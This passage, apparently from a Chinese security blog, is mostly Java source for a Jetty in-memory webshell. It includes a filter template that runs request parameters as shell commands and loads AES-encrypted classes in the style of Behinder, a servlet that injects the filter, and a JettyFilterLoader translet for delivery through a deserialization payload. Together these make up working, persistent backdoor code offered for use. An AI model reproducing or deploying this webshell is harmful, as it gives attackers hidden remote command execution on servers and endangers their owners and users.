<span class="variable">filterName</span> <span class="operator">=</span> (String)GetField(filter, <span class="string">&quot;_filterName&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (filterName.contains(HFilter.getName())) &#123;</span><br><span class="line">                    tmpFilterMaps[<span class="number">0</span>] = filter;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    tmpFilterMaps[n] = filter;</span><br><span class="line">                    ++n;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; tmpFilterMaps.length; ++j) &#123;</span><br><span class="line">                Array.set(filterMaps, j, tmpFilterMaps[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">GetField</span><span class="params">(Object o, String k)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = o.getClass().getDeclaredField(k);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e1)&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Method <span class="title function_">GetMethod</span><span class="params">(Object obj, String methodName, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(methodName, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(methodName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AddFilterShell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LoadFilter();</span><br><span class="line">            GetWebContent();</span><br><span class="line">            InjectFilter();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AddFilterShell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中有一个FilterTemplates也就是要注入的filter，其逻辑如下，可以自定义假如冰蝎和哥斯拉的逻辑</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTemplate</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Dynamic Filter says hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(servletRequest.getParameter(<span class="string">&quot;type&quot;</span>) != <span class="literal">null</span> &amp;&amp; servletRequest.getParameter(<span class="string">&quot;type&quot;</span>).equals(<span class="string">&quot;basic&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//basic cmd shell</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(Config.getPassword());</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty())&#123;</span><br><span class="line">                String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span>(File.separator.equals(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/C&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                servletResponse.getWriter().println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(((HttpServletRequest)servletRequest).getHeader(Config.getHeader()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//behind3 shell</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (((HttpServletRequest)servletRequest).getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">k</span> <span class="operator">=</span> Config.getBehinderShellPwdPwd();</span><br><span class="line">                    ((HttpServletRequest)servletRequest).getSession().setAttribute(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">                    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                    cipher.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>((((HttpServletRequest)servletRequest).getSession().getAttribute(<span class="string">&quot;u&quot;</span>) + <span class="string">&quot;&quot;</span>).getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                    <span class="type">byte</span>[] evilClassBytes = cipher.doFinal(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(evilClassBytes);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">evilObject</span> <span class="operator">=</span> evilClass.newInstance();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> evilClass.getDeclaredMethod(<span class="string">&quot;equals&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ServletRequest.class, ServletResponse.class&#125;);</span><br><span class="line">                    targetMethod.invoke(evilObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;servletRequest, servletResponse&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">        U(ClassLoader c)&#123;<span class="built_in">super</span>(c);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>假如是反序列化注入的话直接用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JettyFilterLoader</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;HFilter&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterClassName</span> <span class="operator">=</span> <span class="string">&quot;com.HFilter&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">LoadFilter</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">a</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">            a.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">byte</span>[] b = (<span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>()).decodeBuffer(<span class="string">&quot;恶意Filter.class|base64&quot;</span>);</span><br><span class="line">            a.invoke(Thread.currentThread().getContextClassLoader(), b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取上下文</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">GetWebContent</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">currentThread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> GetField(currentThread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">_context</span> <span class="operator">=</span> GetField(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">            servletHandler = GetField(_context,<span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">InjectFilter</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span>(servletHandler != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//方法一</span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">HFilter</span> <span class="operator">=</span> (Filter) Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();</span><br><span class="line">            <span class="type">ArrayList</span> <span class="variable">filterPathMappings</span> <span class="operator">=</span> (ArrayList) GetField(servletHandler,<span class="string">&quot;_filterPathMappings&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> servletHandler.getClass().getClassLoader().loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.FilterHolder&quot;</span>).getDeclaredConstructor();</span><br><span class="line">            constructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">filterHolder</span> <span class="operator">=</span> constructor2.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilter</span> <span class="operator">=</span> filterHolder.getClass().getDeclaredMethod(<span class="string">&quot;setFilter&quot;</span>,Filter.class);</span><br><span class="line">            setFilter.invoke(filterHolder,HFilter);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setName</span> <span class="operator">=</span> filterHolder.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;setName&quot;</span>,String.class);</span><br><span class="line">            setName.invoke(filterHolder,filterName);</span><br><span class="line"></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> servletHandler.getClass().getClassLoader().loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.FilterMapping&quot;</span>).getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">filterMapping</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilterName</span> <span class="operator">=</span> filterMapping.getClass().getDeclaredMethod(<span class="string">&quot;setFilterName&quot;</span>,String.class);</span><br><span class="line">            setFilterName.invoke(filterMapping,filterName);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilterHolder</span> <span class="operator">=</span> filterMapping.getClass().getDeclaredMethod(<span class="string">&quot;setFilterHolder&quot;</span>,filterHolder.getClass());</span><br><span class="line">            setFilterHolder.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            setFilterHolder.invoke(filterMapping,filterHolder);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">pathSpecs</span> <span class="operator">=</span> url;</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setPathSpec</span> <span class="operator">=</span> filterMapping.getClass().getDeclaredMethod(<span class="string">&quot;setPathSpec&quot;</span>,String.class);</span><br><span class="line">            setPathSpec.invoke(filterMapping,pathSpecs);</span><br><span class="line"></span><br><span class="line">            filterPathMappings.add(filterMapping);</span><br><span class="line">            System.out.println(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*           </span></span><br><span class="line"><span class="comment">            //方法二</span></span><br><span class="line"><span class="comment">            Class HFilter = Thread.currentThread().getContextClassLoader().loadClass(filterClassName);</span></span><br><span class="line"><span class="comment">            Method addFilterWithMapping = GetMethod(servletHandler, &quot;addFilterWithMapping&quot;, Class.class, String.class, Integer.TYPE);</span></span><br><span class="line"><span class="comment">            addFilterWithMapping.invoke(servletHandler, HFilter, &quot;/*&quot;, 1);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            //使用addFilterWithMapping有个问题，动态添加FilterMapping时，其dispatches可能会与已加载到内存中的FilterMapping重复了，因此需要调整元素在_filterPathMappings中的位置</span></span><br><span class="line"><span class="comment">            Object filterMaps = GetField(servletHandler, &quot;_filterMappings&quot;);</span></span><br><span class="line"><span class="comment">            Object[] tmpFilterMaps = new Object[Array.getLength(filterMaps)];</span></span><br><span class="line"><span class="comment">            int n = 1;</span></span><br><span class="line"><span class="comment">            int j;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            for(j = 0; j &lt; Array.getLength(filterMaps); ++j) &#123;</span></span><br><span class="line"><span class="comment">                Object filter = Array.get(filterMaps, j);</span></span><br><span class="line"><span class="comment">                String filterName = (String)GetField(filter, &quot;_filterName&quot;);</span></span><br><span class="line"><span class="comment">                if (filterName.contains(HFilter.getName())) &#123;</span></span><br><span class="line"><span class="comment">                    tmpFilterMaps[0] = filter;</span></span><br><span class="line"><span class="comment">                &#125; else &#123;</span></span><br><span class="line"><span class="comment">                    tmpFilterMaps[n] = filter;</span></span><br><span class="line"><span class="comment">                    ++n;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            for(j = 0; j &lt; tmpFilterMaps.length; ++j) &#123;</span></span><br><span class="line"><span class="comment">                Array.set(filterMaps, j, tmpFilterMaps[j]);</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">GetField</span><span class="params">(Object o, String k)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = o.getClass().getDeclaredField(k);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e1)&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Method <span class="title function_">GetMethod</span><span class="params">(Object obj, String methodName, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(methodName, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(methodName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JettyFilterLoader</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JettyFilterLoader</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LoadFilter();</span><br><span class="line">            GetWebContent();</span><br><span class="line">            InjectFilter();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样加载恶意类即可。但是别忘了，我们要选择方法二注册恶意filter，具体原因会在流程分析中说到.</p>
